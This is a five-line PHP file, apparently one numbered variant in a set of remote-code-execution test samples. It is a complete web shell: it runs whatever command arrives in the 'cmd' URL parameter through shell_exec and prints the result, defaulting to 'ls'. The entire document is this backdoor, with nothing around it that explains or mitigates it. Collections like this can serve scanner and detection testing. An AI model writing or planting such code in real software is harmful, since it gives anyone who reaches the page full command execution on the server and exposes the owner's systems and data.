<?php
// RCE test variation #852
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>